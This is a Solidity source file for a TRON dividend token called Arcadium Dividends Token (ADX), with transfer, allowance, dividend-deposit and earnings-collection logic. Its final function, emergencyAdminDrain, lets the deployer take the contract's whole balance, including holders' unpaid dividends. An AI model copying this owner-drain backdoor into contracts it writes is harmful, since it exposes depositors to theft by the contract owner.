//SourceUnit: adx.sol

pragma solidity 0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Context {
    constructor () internal { }
    function _msgSender() internal view returns (address) {return msg.sender;}
    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract ArcadiumDividendsToken is Context {
    using SafeMath for uint256;
    
    address public deployer;
    
    string public name = "Arcadium Dividends Token";
    string public symbol = "ADX";
    uint8 public decimals = 6;

    uint256 public scaledRemainder = 0;
    uint256 public scaledDividendPerToken;
    uint256 public scaling = uint256(10) ** 8;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public scaledDividendBalanceOf;
    mapping(address => uint256) public scaledDividendCreditedTo;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    modifier onlyAdmin() {require(msg.sender == deployer);_;}
    
    struct TokenHolder {
        address wallet;
        uint dividendsOwed;
        uint dividendsReceived;
        uint totalDividends;
    }
    
    TokenHolder private holder;

    constructor() public {
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    function update(address account) internal {
        uint256 owed = SafeMath.sub(scaledDividendPerToken, scaledDividendCreditedTo[account]);
        scaledDividendBalanceOf[account] = SafeMath.add(scaledDividendBalanceOf[account], SafeMath.mul(balanceOf[account], owed));
        scaledDividendCreditedTo[account] = scaledDividendPerToken;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);

        update(msg.sender);
        update(to);

        balanceOf[msg.sender] = SafeMath.sub(balanceOf[msg.sender], value);
        balanceOf[to] = SafeMath.add(balanceOf[to], value);

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        update(from);
        update(to);

        balanceOf[from] = SafeMath.sub(balanceOf[from], value);
        balanceOf[to] = SafeMath.add(balanceOf[to], value);
        allowance[from][msg.sender] = SafeMath.sub(allowance[from][msg.sender], value);
        emit Transfer(from, to, value);
        return true;
    }

    function depositTRX() public payable {
        uint256 available = SafeMath.add(SafeMath.mul(msg.value, scaling), scaledRemainder); // scale the deposit and add the previous remainder
        scaledDividendPerToken = SafeMath.add(scaledDividendPerToken, SafeMath.div(available, totalSupply));
        scaledRemainder = available % totalSupply; // compute the new remainder
    }

    function collectEarnings() public {
        update(msg.sender);
        uint256 amount = SafeMath.div(scaledDividendBalanceOf[msg.sender], scaling);
        scaledDividendBalanceOf[msg.sender] %= scaling;  // retain the remainder
        msg.sender.transfer(amount);
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        if (allowance[msg.sender][spender] > 0) {resetApprove(spender);}
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function resetApprove(address spender) public returns (bool success) {
        allowance[msg.sender][spender] = 0;
        return true;
    }
    
    function emergencyAdminDrain() onlyAdmin public {
        uint thisBalance = address(this).balance;
        deployer.transfer(thisBalance);
    }
}